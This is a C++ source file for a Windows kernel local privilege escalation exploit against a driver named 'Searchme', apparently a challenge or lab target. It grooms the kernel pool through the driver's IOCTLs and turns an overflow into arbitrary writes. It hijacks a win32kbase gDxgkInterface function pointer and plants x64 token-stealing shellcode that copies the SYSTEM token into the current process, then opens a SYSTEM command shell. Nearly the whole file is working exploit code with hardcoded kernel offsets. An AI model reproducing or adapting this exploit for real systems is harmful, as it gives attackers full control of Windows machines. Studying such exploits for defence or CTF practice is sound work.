#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

extern "C" PVOID _stdcall NtGdiDdDDICreateAllocation(DWORD64 a1, DWORD64 a2, DWORD64 a3,DWORD64 a4);

#define METHOD1 0x222000
#define METHOD2 0x222004
#define METHOD3 0x222008
#define METHOD4 0x22200C
#define METHOD5 0x222010
typedef ULONGLONG SearchHandle;

#pragma pack(push,1)
typedef struct _addarea_t {
	SearchHandle handle;
	DWORD doc_id;
	UCHAR data[0];
} _addarea_t;
#pragma pack(pop)

typedef NTSTATUS
(__stdcall *pNtAllocateVirtualMemory)(
	__in HANDLE ProcessHandle,
	__inout PVOID *BaseAddress,
	__in ULONG_PTR ZeroBits,
	__inout PSIZE_T RegionSize,
	__in ULONG AllocationType,
	__in ULONG Protect
	);

typedef NTSTATUS(__stdcall *_NtQuerySystemInformation)(
	_In_      ULONG SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
	);

typedef struct _LARGE_UNICODE_STRING
{
	ULONG Length;
	unsigned __int32 MaximumLength : 31;
	unsigned __int32 bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

typedef BOOL(__stdcall *pNtUserDefSetText)(
	HWND hwnd,
	PLARGE_UNICODE_STRING text
	);

typedef int(__stdcall *pNtUserInternalGetWindowText)(
	HWND hwnd,
	LPWSTR buffer,
	int nMaxCount
	);

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024
HANDLE hDevice = NULL;

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

SearchHandle CreateGM() {
	SearchHandle result = NULL;
	DWORD BytesReturned = NULL;
	BOOL ret = DeviceIoControl(hDevice,
		METHOD1,
		&result,
		sizeof(result),
		&result,
		sizeof(result),
		&BytesReturned,
		NULL);
	if (!ret) {
		return -1;
	}
	return result;
}

BOOL CloseGM(SearchHandle g_Handle){
	SearchHandle result = g_Handle;
	DWORD BytesReturned = NULL;
	return DeviceIoControl(hDevice,
		METHOD2,
		&result,
		sizeof(result),
		&result,
		sizeof(result),
		&BytesReturned,
		NULL);
}

BOOL AddGhost(SearchHandle handle, DWORD doc_id, UCHAR* data, ULONG datalen) {
	DWORD BytesReturned = NULL;
	DWORD size = datalen + sizeof(_addarea_t);
	_addarea_t *ptr = (_addarea_t *)malloc(sizeof(_addarea_t));
	ptr->handle = handle;
	ptr->doc_id = doc_id;
	memcpy(ptr->data, data, datalen);
	BOOL ret = DeviceIoControl(hDevice,
		METHOD3,
		ptr,
		size,
		ptr,
		size,
		&BytesReturned,
		NULL);
	free(ptr);
	return ret;
}

SearchHandle CompressGM(SearchHandle handle) {
	SearchHandle result = NULL;
	DWORD BytesReturned = NULL;
	result = handle;
	BOOL ret = DeviceIoControl(hDevice,
		METHOD4,
		&result,
		sizeof(result),
		&result,
		sizeof(result),
		&BytesReturned,
		NULL);
	if (!ret) {
		return -1;
	}
	return result;
}

_NtQuerySystemInformation NtQuerySystemInformation = NULL;
pNtUserDefSetText NtUserDefSetText = NULL;
ULONG_PTR MmUserProbeAddress = 0;
pNtUserInternalGetWindowText NtUserInternalGetWindowText = NULL;
PSYSTEM_MODULE_INFORMATION ModuleInfo;
DWORD len;

LPVOID KernelSymbolInfo(const char *lpSymbolName)
{
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	char *lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;
	//const char *lpSymbolName = "ntoskrnl.exe";

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	for (UINT64 i = 0; i < ModuleInfo->NumberOfModules; i++)
	{
		lpKernelName = (char *)(ModuleInfo->Module[i].FullPathName + ModuleInfo->Module[i].OffsetToFileName);
		if (_stricmp(lpKernelName, lpSymbolName) == 0)
		{
			kernelBase = ModuleInfo->Module[i].ImageBase;
			break;
		}
	}
	if (kernelBase)
	{
		LogMessage(L_INFO, L"base address at: 0x%p", kernelBase);
		return kernelBase;
	}
	else
	{
		LogMessage(L_ERROR, L"Find nt address failure...");
		return 0;
	}
}


void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
}

CHAR ShellCode[] =
"\x48\x89\x11" //mov  [rcx], rdx; Fix win32kbase!gDxgkInterface
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		; Get _ETHREAD pointer from KPCR
"\x4C\x8B\x82\xB8\x00\x00\x00"		// mov r8, [rdx + b8h]		; _EPROCESS (kd> u PsGetCurrentProcess)
"\x4D\x8B\x88\xe8\x02\x00\x00"		// mov r9, [r8 + 2e8h]		; ActiveProcessLinks list head
"\x49\x8B\x09"				// mov rcx, [r9]		; Follow link to first process in list
							//find_system_proc:
	"\x48\x8B\x51\xF8"			// mov rdx, [rcx - 8]		; Offset from ActiveProcessLinks to UniqueProcessId
	"\x48\x83\xFA\x04"			// cmp rdx, 4			; Process with ID 4 is System process
	"\x74\x05"				// jz found_system		; Found SYSTEM token
	"\x48\x8B\x09"				// mov rcx, [rcx]		; Follow _LIST_ENTRY Flink pointer
	"\xEB\xF1"				// jmp find_system_proc		; Loop
							//found_system:
	"\x48\x8B\x41\x70"			// mov rax, [rcx + 70h]		; Offset from ActiveProcessLinks to Token
	"\x24\xF0"				// and al, 0f0h			; Clear low 4 bits of _EX_FAST_REF structure
	"\x49\x89\x80\x58\x03\x00\x00"		// mov [r8 + 358h], rax		; Copy SYSTEM token to current process's token
										//recover:
	"\x48\x83\xc4\x30"			// add rsp, 18h			; Set Stack Pointer to SMEP enable ROP chain
	"\x48\x31\xF6"				// xor rsi, rsi			; Zeroing out rsi register to avoid Crash
	"\x48\x31\xFF"				// xor rdi, rdi			; Zeroing out rdi register to avoid Crash
	"\x48\x31\xC0"				// xor rax, rax			; NTSTATUS Status = STATUS_SUCCESS
	"\xc3"					// ret				; Enable SMEP and Return to IrpDeviceIoCtlHandler+0xe2
	;



int main() {
	LPCWSTR lpDeviceName = L"\\\\.\\Searchme";
	ULONG Interval = 0;
	DWORD BytesReturned = NULL;
	system("pause");
	pNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtAllocateVirtualMemory");
	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQuerySystemInformation");
	NtUserDefSetText = (pNtUserDefSetText)GetProcAddress(GetModuleHandle(TEXT("win32u.dll")), "NtUserDefSetText");	// no more NtSyscall :)
	NtUserInternalGetWindowText = (pNtUserInternalGetWindowText)GetProcAddress(GetModuleHandle(TEXT("win32u.dll")), "NtUserInternalGetWindowText");
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	LogMessage(L_INFO, L"Length: 0x%p", len);
	system("pause");
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(0x1000);
	if (!ModuleInfo)
	{
		return NULL;
	}
	memset((LPVOID)0x4f0000, 0x0, len);
	///////////////////////
	SearchHandle Handle = 0x0;
	SearchHandle CompressHandle[0x800] = { 0 };
	int a = getchar();

	//__debugbreak();
	const char *lpNtSymbolName = "ntoskrnl.exe";
	PVOID ntbase = KernelSymbolInfo(lpNtSymbolName);
	if (!ntbase) {
		LogMessage(L_ERROR, L"Get nt Error");
		exit(-1);
	}
	LogMessage(L_INFO, L"nt at: 0x%p",ntbase);
	const char *lpW32SymbolName = "win32kbase.sys";
	PVOID win32kbase = KernelSymbolInfo(lpW32SymbolName);
	if (!win32kbase) {
		LogMessage(L_ERROR, L"Get win32kbase Error");
		exit(-1);
	}
	LogMessage(L_INFO, L"win32kbase at: 0x%p", win32kbase);
	const char *lpDxgSymbolName = "dxgkrnl.sys";
	PVOID dxgbase = KernelSymbolInfo(lpDxgSymbolName);
	if (!dxgbase) {
		LogMessage(L_ERROR, L"Get dxgkrnl Error");
		exit(-1);
	}
	LogMessage(L_INFO, L"dxg at: 0x%p", dxgbase);
	//__debugbreak()
	//////////////////
	system("pause");
	LogMessage(L_INFO, L"*****Start Exploit*****");
	hDevice = CreateFile(lpDeviceName,					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL); // No attr. template
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		LogMessage(L_ERROR, L"Unable to get Driver handle");
		exit(1);
	}
	LogMessage(L_INFO, L"Create Driver Success,Handle at: 0x%p", hDevice);

	SearchHandle newHandle = CreateGM();
	UCHAR newtoken[16];
	for (int i = 0; i < 224; i++)
	{
		sprintf((char*)newtoken, "%05d", i);
		for (int j = 0; j < 5; j++) {
			newtoken[j] += 'a' - '0';
		}
		AddGhost(newHandle, 0xffff, newtoken, 5);
	}
	char num = 'a';
	//newtoken[0] = 'c';
	//AddGhost(newHandle, 0, newtoken, 1);
	num = 'b';
	for (int i = 0; i < 1; i++) {
		newtoken[i] = num;
	}
	AddGhost(newHandle, 0, newtoken, 1);
	AddGhost(newHandle, 0x23, newtoken, 1);
	AddGhost(newHandle, 7, newtoken, 1);
	AddGhost(newHandle, 0x23, newtoken, 1);
	AddGhost(newHandle, 0x20, newtoken, 1);
	AddGhost(newHandle, 0x23, newtoken, 1);
	num = 'd';
	for (int i = 0; i < 14; i++)
	{
		newtoken[i] = num;
	}
	AddGhost(newHandle, 0, newtoken, 14);
	AddGhost(newHandle, 1, newtoken, 14);
	AddGhost(newHandle, 0x8f, newtoken, 14);

	//__debugbreak();
	LogMessage(L_INFO, L"Create GM");
	Handle = CreateGM();
	if (Handle == -1) {
		LogMessage(L_ERROR, L"Unable to get handle");
	}
	//__debugbreak();
	UCHAR token[16] = { 0 };
	LogMessage(L_INFO, L"Add Ghost to GM");
	for (int i = 0; i < 227; i++) {
		sprintf((char*)token, "%05d", i);
		for (int j = 0; j < 5; j++) {
			token[j] += 'a' - '0';
		}	
		BOOL ret = AddGhost(Handle, 0xffff, token, 5);
		if (!ret) {
			LogMessage(L_ERROR, L"Unable to add ghost");
			exit(-1);
		}
	}
	LogMessage(L_INFO, L"Compress Pool Fengshui");
	for (int i = 0; i < 0x7f0; i++) {
		CompressHandle[i] = CompressGM(Handle);
		//LogMessage(L_INFO, L"Create Compress at: 0x%p", CompressHandle[i]);
	}

	for (int i = 0x7ef; i > 0x7d0; i = i - 2) {
		CloseGM(CompressHandle[i]);
	}

	//__debugbreak();
	LogMessage(L_INFO, L"Compress Pool at: 0x%p",CompressHandle[0x7bf]);

	SearchHandle NewTest = CompressGM(newHandle);
	LogMessage(L_INFO, L"Worker Pool at: 0x%p", NewTest);
	//__debugbreak();


	LogMessage(L_INFO, L"Overflow at: 0x%p", NewTest+0x1000);

	SearchHandle ManagerPool = NewTest + 0x1000;
	//PVOID win32kbaseaddr = KernelSymbolInfo();

	PVOID baseAddr = (PVOID)0x3a200000000;
	SIZE_T regionSize = 0x1000;
	NtAllocateVirtualMemory(GetCurrentProcess(), &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PVOID fakeArea = (PVOID)0x9800000000;
	NtAllocateVirtualMemory(GetCurrentProcess(), &fakeArea, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PVOID fakeArea1 = (PVOID)0x2c000000;
	NtAllocateVirtualMemory(GetCurrentProcess(), &fakeArea1, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PVOID fakeArea2 = (PVOID)0x3c000000;
	NtAllocateVirtualMemory(GetCurrentProcess(), &fakeArea2, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

#define W32DXGINTERFACEOFFSET 0x1B5EF0
#define EXALLOCATEPOOLOFFSET 0x2F4410
#define W32DXGCREATEOFFSET 0x76560
#define DXGOFFSET 0xCB6B0
	DWORD64 win32kbasegDxgAddress = (DWORD64)win32kbase + W32DXGINTERFACEOFFSET + 0x70;
#define MAGIC 0x3a200000394
	* (ULONG_PTR*)(MAGIC) = 1;
	*(ULONG_PTR*)(MAGIC + 8) = 1;
	*(ULONG_PTR*)(MAGIC + 0x10) = (DWORD64)fakeArea;
	
	UCHAR fakeToken[16] = {0};	
	char to = 'd';
	for (int i = 0; i < 15; i++) {
		fakeToken[i] = to;
	}
	DWORD64 cursize = (win32kbasegDxgAddress - (DWORD64)fakeArea - 0x20) / 4 ;
	DWORD64 fakesize = 0xffffffffffffffff;
	CopyMemory(fakeArea, fakeToken, 16);
	CopyMemory((PVOID *)((DWORD64)fakeArea + 16), &cursize, sizeof(DWORD64));
	CopyMemory((PVOID *)((DWORD64)fakeArea + 16 + sizeof(DWORD64)), &fakesize, sizeof(DWORD64));
	DWORD64 ntExPoolWithTagAddr = (DWORD64)ntbase + EXALLOCATEPOOLOFFSET;
	//__debugbreak();
	DWORD32 WriteDWORD1 = ntExPoolWithTagAddr;
	DWORD32 WriteDWORD2 = ntExPoolWithTagAddr >> 32;
	//__debugbreak();
	AddGhost(ManagerPool, WriteDWORD1, fakeToken, 15);
	AddGhost(ManagerPool, WriteDWORD2, fakeToken, 15);

	//__debugbreak();
	PVOID poolAddr = NtGdiDdDDICreateAllocation(0, 0x100, 0x41424344,0x111);
	//__debugbreak();
	//Write Shellcode
	LogMessage(L_INFO, L"NonPaged Pool allocate at: 0x%p", poolAddr);
	*(ULONG_PTR*)(MAGIC) = 1;
	*(ULONG_PTR*)(MAGIC + 8) = 1;
	*(ULONG_PTR*)(MAGIC + 0x10) = (DWORD64)fakeArea1;
	UCHAR fakeToken1[16] = { 0 };
	to = 'd';
	for (int i = 0; i < 15; i++) {
		fakeToken1[i] = to;
	}
	DWORD64 ShellCodesize = ((DWORD64)poolAddr - (DWORD64)fakeArea1 - 0x20) / 4;
	CopyMemory(fakeArea1, fakeToken1, 16);
	CopyMemory((PVOID *)((DWORD64)fakeArea1 + 16), &ShellCodesize, sizeof(DWORD64));
	CopyMemory((PVOID *)((DWORD64)fakeArea1 + 16 + sizeof(DWORD64)), &fakesize, sizeof(DWORD64));
	DWORD32 WriteDWORD3;
	for (int i = 0; i < 18; i++) {
		CopyMemory(&WriteDWORD3, ShellCode + i * 4, sizeof(DWORD32));
		AddGhost(ManagerPool, WriteDWORD3, fakeToken1, 15);
	}
	//__debugbreak();

	//Write NtGdiDdDDICreateAllocation -> poolAddr
	*(ULONG_PTR*)(MAGIC) = 1;
	*(ULONG_PTR*)(MAGIC + 8) = 1;
	*(ULONG_PTR*)(MAGIC + 0x10) = (DWORD64)fakeArea2;
	DWORD64 gDxgkInterfaceTable = (win32kbasegDxgAddress - (DWORD64)fakeArea2 - 0x20) / 4;
	CopyMemory(fakeArea2, fakeToken, 16);
	CopyMemory((PVOID *)((DWORD64)fakeArea2 + 16), &gDxgkInterfaceTable, sizeof(DWORD64));
	CopyMemory((PVOID *)((DWORD64)fakeArea2 + 16 + sizeof(DWORD64)), &fakesize, sizeof(DWORD64));
	DWORD32 WriteDWORD4 = (DWORD64)poolAddr;
	DWORD32 WriteDWORD5 = (DWORD64)poolAddr >> 32;
	AddGhost(ManagerPool, WriteDWORD4, fakeToken, 15);
	AddGhost(ManagerPool, WriteDWORD5, fakeToken, 15);
	//__debugbreak();
	DWORD64 win32kbaseCreateAddr = (DWORD64)dxgbase + DXGOFFSET;
	NtGdiDdDDICreateAllocation(win32kbasegDxgAddress, win32kbaseCreateAddr, 0, 0);
	//__debugbreak();
	PopShell();
	//__debugbreak();
	//for (int i = 0; i < 0x7f0; i++) {
	//	BOOL ret = CloseGM(CompressHandle[i]);
	//}
	//__debugbreak();
	return 0;
}